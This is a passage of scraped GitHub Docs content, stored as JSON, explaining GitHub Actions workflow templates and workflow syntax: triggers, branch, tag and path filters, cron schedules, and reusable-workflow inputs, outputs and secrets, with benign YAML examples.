          "For continuous integration (CI) workflows, seeBuilding and testing.",
          "For building and publishing packages, seePublishing packages.",
          "For deploying projects, seeUse cases and examples.",
          "For automating tasks and processes on GitHub, seeManaging projects.",
          "For examples that demonstrate more complex features of GitHub Actions, seeUse cases and examples. These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.",
          "To certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, seeAbout GitHub Certifications."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/using-workflow-templates",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow templates"
      },
      {
        "type": "paragraph",
        "text": "Workflow templates are templates that help you to create your own GitHub Actions workflows for a repository. They offer an alternative to starting from a blank workflow file and are useful because some of the work will already have been done for you."
      },
      {
        "type": "paragraph",
        "text": "GitHub offers workflow templates for a variety of languages and tooling. When you set up workflows in your repository, GitHub analyzes the code in your repository and recommends workflows based on the language and framework in your repository. For example, if you use Node.js, GitHub will suggest a workflow template file that installs your Node.js packages and runs your tests. You can search and filter to find relevant workflow templates."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides ready-to-use workflow templates for the following high level categories:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Deployment (CD). For more information, seeAbout continuous deployment with GitHub Actions."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Security. For more information, seeConfiguring advanced setup for code scanning."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Continuous Integration (CI). For more information, seeAbout continuous integration with GitHub Actions.",
          "Automation. Automation workflow templates offer solutions for automating workflows, such as triaging pull requests and applying a label based on the paths that are modified in the pull request, or greeting users who are first time contributors to the repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "Use these workflows as a starting place to build your custom workflow or use them as-is. You can browse the full list of workflow templates in theactions/starter-workflowsrepository. For more information, seeUsing workflow templates."
      },
      {
        "type": "paragraph",
        "text": "You can also create your own workflow template to share with your organization. These workflow templates will appear alongside the GitHub-provided workflow templates. Anyone with write access to the organization's.githubrepository can set up a workflow template. For more information, seeCreating workflow templates for your organization."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing and using a workflow template"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Find the workflow template that you want to use, then clickConfigure. To help you find the workflow template that you want, you can search for keywords or filter by category.",
          "If the workflow template contains comments detailing additional setup steps, follow these steps.There are guides to accompany many of the workflow templates for building and testing projects. For more information, seeBuilding and testing.",
          "Some workflow templates use secrets. For example,${{ secrets.npm_token }}. If the workflow template uses a secret, store the value described in the secret name as a secret in your repository. For more information, seeUsing secrets in GitHub Actions.",
          "Optionally, make additional changes. For example, you might want to change the value ofonto change when the workflow runs.",
          "ClickStart commit.",
          "Write a commit message and decide whether to commit directly to the default branch or to open a pull request."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "About continuous integration with GitHub Actions",
          "Managing workflow runs and deployments",
          "Monitoring and troubleshooting workflows",
          "Managing billing for GitHub Actions"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About YAML syntax for workflows"
      },
      {
        "type": "paragraph",
        "text": "Workflow files use YAML syntax, and must have either a.ymlor.yamlfile extension. If you're new to YAML and want to learn more, seeLearn YAML in Y minutes."
      },
      {
        "type": "paragraph",
        "text": "You must store workflow files in the.github/workflowsdirectory of your repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "name"
      },
      {
        "type": "paragraph",
        "text": "The name of the workflow. GitHub displays the names of your workflows under your repository's \"Actions\" tab. If you omitname, GitHub displays the workflow file path relative to the root of the repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "run-name"
      },
      {
        "type": "paragraph",
        "text": "The name for workflow runs generated from the workflow. GitHub displays the workflow run name in the list of workflow runs on your repository's \"Actions\" tab. Ifrun-nameis omitted or is only whitespace, then the run name is set to event-specific information for the workflow run. For example, for a workflow triggered by apushorpull_requestevent, it is set as the commit message or the title of the pull request."
      },
      {
        "type": "paragraph",
        "text": "This value can include expressions and can reference thegithubandinputscontexts."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofrun-name"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "run-name: Deploy to ${{ inputs.deploy_target }} by @${{ github.actor }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on"
      },
      {
        "type": "paragraph",
        "text": "To automatically trigger a workflow, useonto define which events can cause the workflow to run. For a list of available events, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "You can define single or multiple events that can trigger a workflow, or set a time schedule. You can also restrict the execution of a workflow to only occur for specific files, tags, or branch changes. These options are described in the following sections."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a single event"
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the followingonvalue will run when a push is made to any branch in the workflow's repository:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: push"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple events"
      },
      {
        "type": "paragraph",
        "text": "You can specify a single event or multiple events. For example, a workflow with the followingonvalue will run when a push is made to any branch in the repository or when someone forks the repository:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push, fork]"
      },
      {
        "type": "paragraph",
        "text": "If you specify multiple events, only one of those events needs to occur to trigger your workflow. If multiple triggering events for your workflow occur at the same time, multiple workflow runs will be triggered."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using activity types"
      },
      {
        "type": "paragraph",
        "text": "Some events have activity types that give you more control over when your workflow should run. Useon.<event_name>.typesto define the type of event activity that will trigger a workflow run."
      },
      {
        "type": "paragraph",
        "text": "For example, theissue_commentevent has thecreated,edited, anddeletedactivity types. If your workflow triggers on thelabelevent, it will run whenever a label is created, edited, or deleted. If you specify thecreatedactivity type for thelabelevent, your workflow will run when a label is created but not when a label is edited or deleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types:\n      - created"
      },
      {
        "type": "paragraph",
        "text": "If you specify multiple activity types, only one of those event activity types needs to occur to trigger your workflow. If multiple triggering event activity types for your workflow occur at the same time, multiple workflow runs will be triggered. For example, the following workflow triggers when an issue is opened or labeled. If an issue with two labels is opened, three workflow runs will start: one for the issue opened event and two for the two issue labeled events."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - opened\n      - labeled"
      },
      {
        "type": "paragraph",
        "text": "For more information about each event and their activity types, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using filters"
      },
      {
        "type": "paragraph",
        "text": "Some events have filters that give you more control over when your workflow should run."
      },
      {
        "type": "paragraph",
        "text": "For example, thepushevent has abranchesfilter that causes your workflow to run only when a push to a branch that matches thebranchesfilter occurs, instead of when any push occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n      - 'releases/**'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using activity types and filters with multiple events"
      },
      {
        "type": "paragraph",
        "text": "If you specify activity types or filters for an event and your workflow triggers on multiple events, you must configure each event separately. You must append a colon (:) to all events, including events without configuration."
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the followingonvalue will run when:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A label is created",
          "A push is made to themainbranch in the repository",
          "A push is made to a GitHub Pages-enabled branch"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types:\n      - created\n  push:\n    branches:\n      - main\n  page_build:"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.<event_name>.types"
      },
      {
        "type": "paragraph",
        "text": "Useon.<event_name>.typesto define the type of activity that will trigger a workflow run. Most GitHub events are triggered by more than one type of activity. For example, thelabelis triggered when a label iscreated,edited, ordeleted. Thetypeskeyword enables you to narrow down activity that causes the workflow to run. When only one activity type triggers a webhook event, thetypeskeyword is unnecessary."
      },
      {
        "type": "paragraph",
        "text": "You can use an array of eventtypes. For more information about each event and their activity types, seeEvents that trigger workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types: [created, edited]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.<pull_request|pull_request_target>.<branches|branches-ignore>"
      },
      {
        "type": "paragraph",
        "text": "When using thepull_requestandpull_request_targetevents, you can configure a workflow to run only for pull requests that target specific branches."
      },
      {
        "type": "paragraph",
        "text": "Use thebranchesfilter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use thebranches-ignorefilter when you only want to exclude branch name patterns. You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thebranchesandbranches-ignorekeywords accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including branches"
      },
      {
        "type": "paragraph",
        "text": "The patterns defined inbranchesare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apull_requestevent for a pull request targeting:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmain(refs/heads/main)",
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name starts withreleases/, likereleases/10(refs/heads/releases/10)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "If a workflow is skipped due to branch filtering,path filtering, or acommit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Excluding branches"
      },
      {
        "type": "paragraph",
        "text": "When a pattern matches thebranches-ignorepattern, the workflow will not run. The patterns defined inbranches-ignoreare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apull_requestevent unless the pull request is targeting:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name matchesreleases/**-alpha, likereleases/beta/3-alpha(refs/heads/releases/beta/3-alpha)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including and excluding branches"
      },
      {
        "type": "paragraph",
        "text": "You cannot usebranchesandbranches-ignoreto filter the same event in a single workflow. If you want to both include and exclude branch patterns for a single event, use thebranchesfilter along with the!character to indicate which branches should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a branch with the!character, you must also define at least one branch without the!character. If you only want to exclude branches, usebranches-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the Git ref.",
          "A matching positive pattern after a negative match will include the Git ref again."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following workflow will run onpull_requestevents for pull requests that targetreleases/10orreleases/beta/mona, but not for pull requests that targetreleases/10-alphaorreleases/beta/3-alphabecause the negative pattern!releases/**-alphafollows the positive pattern."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.push.<branches|tags|branches-ignore|tags-ignore>"
      },
      {
        "type": "paragraph",
        "text": "When using thepushevent, you can configure a workflow to run on specific branches or tags."
      },
      {
        "type": "paragraph",
        "text": "Use thebranchesfilter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use thebranches-ignorefilter when you only want to exclude branch name patterns. You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Use thetagsfilter when you want to include tag name patterns or when you want to both include and exclude tag names patterns. Use thetags-ignorefilter when you only want to exclude tag name patterns. You cannot use both thetagsandtags-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "If you define onlytags/tags-ignoreor onlybranches/branches-ignore, the workflow won't run for events affecting the undefined Git ref. If you define neithertags/tags-ignoreorbranches/branches-ignore, the workflow will run for events affecting either branches or tags. If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thebranches,branches-ignore,tags, andtags-ignorekeywords accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch or tag name. If a name contains any of these characters and you want a literal match, you need toescapeeach of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including branches and tags"
      },
      {
        "type": "paragraph",
        "text": "The patterns defined inbranchesandtagsare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apushevent to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmain(refs/heads/main)",
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name starts withreleases/, likereleases/10(refs/heads/releases/10)",
          "A tag namedv2(refs/tags/v2)",
          "A tag whose name starts withv1., likev1.9.1(refs/tags/v1.9.1)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n    # Sequence of patterns matched against refs/tags\n    tags:\n      - v2\n      - v1.*"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Excluding branches and tags"
      },
      {
        "type": "paragraph",
        "text": "When a pattern matches thebranches-ignoreortags-ignorepattern, the workflow will not run. The patterns defined inbranchesandtagsare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apushevent, unless thepushevent is to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name matchesreleases/**-alpha, likereleases/beta/3-alpha(refs/heads/releases/beta/3-alpha)",
          "A tag namedv2(refs/tags/v2)",
          "A tag whose name starts withv1., likev1.9(refs/tags/v1.9)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n    # Sequence of patterns matched against refs/tags\n    tags-ignore:\n      - v2\n      - v1.*"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including and excluding branches and tags"
      },
      {
        "type": "paragraph",
        "text": "You can't usebranchesandbranches-ignoreto filter the same event in a single workflow. Similarly, you can't usetagsandtags-ignoreto filter the same event in a single workflow. If you want to both include and exclude branch or tag patterns for a single event, use thebranchesortagsfilter along with the!character to indicate which branches or tags should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a branch with the!character, you must also define at least one branch without the!character. If you only want to exclude branches, usebranches-ignoreinstead. Similarly, if you define a tag with the!character, you must also define at least one tag without the!character. If you only want to exclude tags, usetags-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the Git ref.",
          "A matching positive pattern after a negative match will include the Git ref again."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following workflow will run on pushes toreleases/10orreleases/beta/mona, but not onreleases/10-alphaorreleases/beta/3-alphabecause the negative pattern!releases/**-alphafollows the positive pattern."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.<push|pull_request|pull_request_target>.<paths|paths-ignore>"
      },
      {
        "type": "paragraph",
        "text": "When using thepushandpull_requestevents, you can configure a workflow to run based on what file paths are changed. Path filters are not evaluated for pushes of tags."
      },
      {
        "type": "paragraph",
        "text": "Use thepathsfilter when you want to include file path patterns or when you want to both include and exclude file path patterns. Use thepaths-ignorefilter when you only want to exclude file path patterns. You cannot use both thepathsandpaths-ignorefilters for the same event in a workflow. If you want to both include and exclude path patterns for a single event, use thepathsfilter prefixed with the!character to indicate which paths should be excluded."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The order that you definepathspatterns matters:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the path.",
          "A matching positive pattern after a negative match will include the path again."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thepathsandpaths-ignorekeywords accept glob patterns that use the*and**wildcard characters to match more than one path name. For more information, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including paths"
      },
      {
        "type": "paragraph",
        "text": "If at least one path matches a pattern in thepathsfilter, the workflow runs. For example, the following workflow would run anytime you push a JavaScript file (.js)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "If a workflow is skipped due to path filtering,branch filtering, or acommit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Excluding paths"
      },
      {
        "type": "paragraph",
        "text": "When all the path names match patterns inpaths-ignore, the workflow will not run. If any path names do not match patterns inpaths-ignore, even if some path names match the patterns, the workflow will run."
      },
      {
        "type": "paragraph",
        "text": "A workflow with the following path filter will only run onpushevents that include at least one file outside thedocsdirectory at the root of the repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths-ignore:\n      - 'docs/**'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Including and excluding paths"
      },
      {
        "type": "paragraph",
        "text": "You cannot usepathsandpaths-ignoreto filter the same event in a single workflow. If you want to both include and exclude path patterns for a single event, use thepathsfilter prefixed with the!character to indicate which paths should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a path with the!character, you must also define at least one path without the!character. If you only want to exclude paths, usepaths-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you definepathspatterns matters:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the path.",
          "A matching positive pattern after a negative match will include the path again."
        ]
      },
      {
        "type": "paragraph",
        "text": "This example runs anytime thepushevent includes a file in thesub-projectdirectory or its subdirectories, unless the file is in thesub-project/docsdirectory. For example, a push that changedsub-project/index.jsorsub-project/src/index.jswill trigger a workflow run, but a push changing onlysub-project/docs/readme.mdwill not."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths:\n      - 'sub-project/**'\n      - '!sub-project/docs/**'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Git diff comparisons"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you push more than 1,000 commits, or if GitHub does not generate the diff due to a timeout, the workflow will always run."
      },
      {
        "type": "paragraph",
        "text": "The filter determines if a workflow should run by evaluating the changed files and running them against thepaths-ignoreorpathslist. If there are no files changed, the workflow will not run."
      },
      {
        "type": "paragraph",
        "text": "GitHub generates the list of changed files using two-dot diffs for pushes and three-dot diffs for pull requests:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Pull requests:Three-dot diffs are a comparison between the most recent version of the topic branch and the commit where the topic branch was last synced with the base branch.",
          "Pushes to existing branches:A two-dot diff compares the head and base SHAs directly with each other.",
          "Pushes to new branches:A two-dot diff against the parent of the ancestor of the deepest commit pushed."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Diffs are limited to 300 files. If there are files changed that aren't matched in the first 300 files returned by the filter, the workflow will not run. You may need to create more specific filters so that the workflow will run automatically."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout comparing branches in pull requests."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.schedule"
      },
      {
        "type": "paragraph",
        "text": "You can useon.scheduleto define a time schedule for your workflows. You can schedule a workflow to run at specific UTC times usingPOSIX cron syntax. Scheduled workflows run on the latest commit on the default or base branch. The shortest interval you can run scheduled workflows is once every 5 minutes."
      },
      {
        "type": "paragraph",
        "text": "This example triggers the workflow every day at 5:30 and 17:30 UTC:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  schedule:\n    # * is a special character in YAML so you have to quote this string\n    - cron:  '30 5,17 * * *'"
      },
      {
        "type": "paragraph",
        "text": "A single workflow can be triggered by multiplescheduleevents. You can access the schedule event that triggered the workflow through thegithub.event.schedulecontext. This example triggers the workflow to run at 5:30 UTC every Monday-Thursday, but skips theNot on Monday or Wednesdaystep on Monday and Wednesday."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  schedule:\n    - cron: '30 5 * * 1,3'\n    - cron: '30 5 * * 2,4'\n\njobs:\n  test_schedule:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Not on Monday or Wednesday\n        if: github.event.schedule != '30 5 * * 1,3'\n        run: echo \"This step will be skipped on Monday and Wednesday\"\n      - name: Every time\n        run: echo \"This step will always run\""
      },
      {
        "type": "paragraph",
        "text": "For more information about cron syntax, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call"
      },
      {
        "type": "paragraph",
        "text": "Useon.workflow_callto define the inputs and outputs for a reusable workflow. You can also map the secrets that are available to the called workflow. For more information on reusable workflows, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.inputs"
      },
      {
        "type": "paragraph",
        "text": "When using theworkflow_callkeyword, you can optionally specify inputs that are passed to the called workflow from the caller workflow. For more information about theworkflow_callkeyword, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "In addition to the standard input parameters that are available,on.workflow_call.inputsrequires atypeparameter. For more information, seeon.workflow_call.inputs.<input_id>.type."
      },
      {
        "type": "paragraph",
        "text": "If adefaultparameter is not set, the default value of the input isfalsefor a boolean,0for a number, and\"\"for a string."
      },
      {
        "type": "paragraph",
        "text": "Within the called workflow, you can use theinputscontext to refer to an input. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "If a caller workflow passes an input that is not specified in the called workflow, this results in an error."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofon.workflow_call.inputs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_call:\n    inputs:\n      username:\n        description: 'A username passed from the caller workflow'\n        default: 'john-doe'\n        required: false\n        type: string\n\njobs:\n  print-username:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Print the input name to STDOUT\n        run: echo The username is ${{ inputs.username }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.inputs.<input_id>.type"
      },
      {
        "type": "paragraph",
        "text": "Required if input is defined for theon.workflow_callkeyword. The value of this parameter is a string specifying the data type of the input. This must be one of:boolean,number, orstring."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.outputs"
      },
      {
        "type": "paragraph",
        "text": "A map of outputs for a called workflow. Called workflow outputs are available to all downstream jobs in the caller workflow. Each output has an identifier, an optionaldescription,and avalue.Thevaluemust be set to the value of an output from a job within the called workflow."
      },
      {
        "type": "paragraph",
        "text": "In the example below, two outputs are defined for this reusable workflow:workflow_output1andworkflow_output2. These are mapped to outputs calledjob_output1andjob_output2, both from a job calledmy_job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofon.workflow_call.outputs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      workflow_output1:\n        description: \"The first job output\"\n        value: ${{ jobs.my_job.outputs.job_output1 }}\n      workflow_output2:\n        description: \"The second job output\"\n        value: ${{ jobs.my_job.outputs.job_output2 }}"
      },
      {
        "type": "paragraph",
        "text": "For information on how to reference a job output, seejobs.<job_id>.outputs. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.secrets"
      },
      {
        "type": "paragraph",
        "text": "A map of the secrets that can be used in the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Within the called workflow, you can use thesecretscontext to refer to a secret."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you are passing the secret to a nested reusable workflow, then you must usejobs.<job_id>.secretsagain to pass the secret. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "If a caller workflow passes a secret that is not specified in the called workflow, this results in an error."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofon.workflow_call.secrets"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_call:\n    secrets:\n      access-token:\n        description: 'A token passed from the caller workflow'\n        required: false\n\njobs:\n\n  pass-secret-to-action:\n    runs-on: ubuntu-latest\n    steps:\n    # passing the secret to an action\n      - name: Pass the received secret to an action\n        uses: ./.github/actions/my-action\n        with:\n          token: ${{ secrets.access-token }}\n\n  # passing the secret to a nested reusable workflow\n  pass-secret-to-workflow:\n    uses: ./.github/workflows/my-workflow\n    secrets:\n       token: ${{ secrets.access-token }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.secrets.<secret_id>"
      },
      {
        "type": "paragraph",
        "text": "A string identifier to associate with the secret."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_call.secrets.<secret_id>.required"
      },
      {
        "type": "paragraph",
        "text": "A boolean specifying whether the secret must be supplied."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_run.<branches|branches-ignore>"
      },
      {
        "type": "paragraph",
        "text": "When using theworkflow_runevent, you can specify what branches the triggering workflow must run on in order to trigger your workflow."
      },
      {
        "type": "paragraph",
        "text": "Thebranchesandbranches-ignorefilters accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need toescapeeach of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the following trigger will only run when the workflow namedBuildruns on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "A workflow with the following trigger will only run when the workflow namedBuildruns on a branch that is not namedcanary:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches-ignore:\n      - \"canary\""
      },
      {
        "type": "paragraph",
        "text": "You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow. If you want to both include and exclude branch patterns for a single event, use thebranchesfilter along with the!character to indicate which branches should be excluded."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the branch.",
          "A matching positive pattern after a negative match will include the branch again."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the following trigger will run when the workflow namedBuildruns on a branch that is namedreleases/10orreleases/beta/monabut will notreleases/10-alpha,releases/beta/3-alpha, ormain."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_dispatch"
      },
      {
        "type": "paragraph",
        "text": "When using theworkflow_dispatchevent, you can optionally specify inputs that are passed to the workflow."
      },
      {
        "type": "paragraph",
        "text": "This trigger only receives events when the workflow file is on the default branch."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_dispatch.inputs"
      },
      {
        "type": "paragraph",
        "text": "The triggered workflow receives the inputs in theinputscontext. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The workflow will also receive the inputs in thegithub.event.inputscontext. The information in theinputscontext andgithub.event.inputscontext is identical except that theinputscontext preserves Boolean values as Booleans instead of converting them to strings. Thechoicetype resolves to a string and is a single selectable option.",
          "The maximum number of top-level properties forinputsis 10.",
          "The maximum payload forinputsis 65,535 characters."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofon.workflow_dispatch.inputs"
      },
      {
        "type": "code",
        "language": "yaml",
